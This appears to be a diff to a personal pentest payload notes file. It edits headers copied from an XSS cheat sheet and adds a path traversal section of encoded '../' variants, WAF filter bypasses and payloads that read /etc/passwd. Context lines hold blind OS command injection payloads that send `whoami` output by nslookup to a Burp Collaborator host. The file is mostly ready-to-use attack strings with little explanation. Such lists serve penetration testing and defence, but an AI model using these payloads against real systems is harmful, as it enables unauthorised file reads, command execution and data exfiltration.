@@ -437,7 +437,7 @@ javascript&#9:1
 ________________________________________________________________________________________________________________________
 © 2020 Brute Logic – All rights reserved. 19
 
-XSS Cheat Sheet – 2020 Edition
+XSS Cheat Sheet – 2020 Edition
 
 ________________________________________________________________________________
 AngularJS Injection (v1.6+) – No Parentheses, Brackets or Quotes
@@ -473,7 +473,7 @@ four ones work only in Firefox.
 ________________________________________________________________________________________________________________________
 © 2020 Brute Logic – All rights reserved. 20
 
-XSS Cheat Sheet – 2020 Edition
+XSS Cheat Sheet – 2020 Edition
 
 ________________________________________________________________________________
 Remote Script Call
@@ -1303,3 +1303,55 @@ x||nslookup+x.burpcollaborator.net||
  Blind OS command injection with out-of-band data exfiltration
 
   email=test@aaa.net||nslookup+`whoami`.in97b7vivx3e5q9rrwctxa9xfole93.burpcollaborator.net||
+
+=================================================================================
+  path traversal
+  ../
+..\
+..\/
+%2e%2e%2f
+%252e%252e%252f
+%c0%ae%c0%ae%c0%af
+%uff0e%uff0e%u2215
+%uff0e%uff0e%u2216
+
+16 bits Unicode encoding
+
+. = %u002e
+/ = %u2215
+\ = %u2216
+
+
+UTF-8 Unicode encoding
+
+. = %c0%2e, %e0%40%ae, %c0ae
+/ = %c0%af, %e0%80%af, %c0%2f
+\ = %c0%5c, %c0%80%5c
+
+
+Bypass "../" replaced by ""
+
+Sometimes you encounter a WAF which remove the "../" characters from the strings, just duplicate them.
+
+..././
+...\.\
+
+
+Bypass "../" with ";"
+
+..;/
+http://domain.tld/page.jsp?include=..;/..;/sensitive.txt 
+
+Double URL encoding
+
+. = %252e
+/ = %252f
+\ = %255c
+
+  ....//....//....//etc/passwd
+
+  ..%252f..%252f..%252fetc/passwd
+
+  /var/www/../../../etc/passwd
+
+  ../../../etc/passwd%00.png
